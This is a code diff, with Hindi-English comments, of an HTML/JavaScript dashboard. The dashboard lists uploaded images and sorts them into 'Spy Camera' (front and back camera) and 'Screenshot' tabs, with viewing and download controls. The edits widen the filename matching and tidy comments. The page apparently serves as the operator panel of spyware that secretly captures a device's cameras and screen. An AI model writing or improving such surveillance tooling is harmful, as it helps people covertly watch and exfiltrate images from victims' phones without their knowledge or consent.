@@ -99,7 +99,12 @@
             background-color: rgba(0,0,0,0.95);
             align-items: center; justify-content: center; flex-direction: column;
         }
-        .modal img { max-width: 95%; max-height: 80vh; border-radius: 5px; box-shadow: 0 0 20px #000; }
+        /* Modal Image Fix: Contain taaki puri screenshot dikhe */
+        .modal img { 
+            max-width: 95%; max-height: 80vh; 
+            border-radius: 5px; box-shadow: 0 0 20px #000; 
+            object-fit: contain; 
+        }
         .modal-close { position: absolute; top: 20px; right: 20px; color: #fff; font-size: 2rem; cursor: pointer; }
         
         .modal-actions { margin-top: 20px; display: flex; gap: 20px; }
@@ -189,7 +194,7 @@
 
                     if (files.length > 0) {
                         allFilesData = files;
-                        filterFiles('camera'); // By default Camera tab khulega
+                        filterFiles('camera'); // Load default
                     } else {
                         emptyState.style.display = 'block';
                         emptyState.innerText = "No data uploaded yet.";
@@ -197,10 +202,11 @@
                 })
                 .catch(error => {
                     loading.innerHTML = "<span style='color:red'>Failed to connect.</span>";
+                    console.error(error);
                 });
         }
 
-        // 🔥 STRICT FILTER LOGIC (Sirf Spy or Screen dikhega)
+        // 🔥 UPDATED FILTER LOGIC (YAHAN CHANGE KIYA HAI)
         function filterFiles(category) {
             currentFilter = category;
 
@@ -219,16 +225,16 @@
                 
                 // TAB 1: SPY CAMERA
                 if (category === 'camera') {
-                    // Sirf tabhi dikhao agar 'front_camera' ya 'back_camera' likha ho
-                    return lowerUrl.includes('front_camera') || lowerUrl.includes('back_camera');
+                    // Check for common camera terms
+                    return lowerUrl.includes('front') || lowerUrl.includes('back') || lowerUrl.includes('cam');
                 } 
                 // TAB 2: SCREENSHOT
                 else if (category === 'screen') {
-                    // Sirf tabhi dikhao agar 'screen_capture' likha ho
-                    return lowerUrl.includes('screen_capture');
+                    // Yahan fix kiya hai: "screen", "screenshot", "capture" sab allow kar diya
+                    return lowerUrl.includes('screen') || lowerUrl.includes('shot') || lowerUrl.includes('capture');
                 }
                 
-                return false; // Jo normal gallery hai wo yahan nahi dikhegi
+                return false;
             });
 
             if (filtered.length === 0) {
@@ -242,10 +248,10 @@
                 div.className = 'img-card';
                 div.onclick = () => openModal(url);
 
-                let badgeText = "";
-                if(url.includes('front_camera')) badgeText = "Front Cam";
-                if(url.includes('back_camera')) badgeText = "Back Cam";
-                if(url.includes('screen_capture')) badgeText = "Screen";
+                let badgeText = "Image";
+                if(url.includes('front')) badgeText = "Front Cam";
+                if(url.includes('back')) badgeText = "Back Cam";
+                if(url.includes('screen')) badgeText = "Screen";
 
                 div.innerHTML = `
                     <img src="${url}" loading="lazy" onerror="this.style.display='none'">
@@ -255,7 +261,7 @@
             });
         }
 
-        // Modal
+        // Modal Functions
         function openModal(url) {
             fullImage.src = url;
             downloadLink.href = url;
